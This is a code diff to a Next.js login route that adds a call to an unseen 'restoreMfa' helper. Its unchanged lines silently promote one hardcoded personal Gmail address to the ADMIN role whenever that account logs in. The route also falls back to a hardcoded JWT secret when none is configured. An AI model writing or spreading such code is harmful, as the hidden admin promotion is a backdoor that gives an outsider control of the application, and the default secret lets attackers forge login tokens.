@@ -2,6 +2,7 @@ import { NextRequest, NextResponse } from 'next/server';
 import bcrypt from 'bcryptjs';
 import prisma from '@/lib/prisma';
 import { SignJWT } from 'jose';
+import { restoreMfa } from '@/lib/mfaBackup';
 
 const JWT_SECRET = process.env.JWT_SECRET || 'super_secret_for_dev_only';
 
@@ -15,6 +16,9 @@ export async function POST(req: NextRequest) {
     }
 
     let user = await prisma.user.findUnique({ where: { email } });
+    
+    // Restore 2FA details from backup memory if missing
+    user = await restoreMfa(user);
     
     if (user && email.toLowerCase() === 'nicholauscostochetty@gmail.com' && user.role !== 'ADMIN') {
       user = await prisma.user.update({
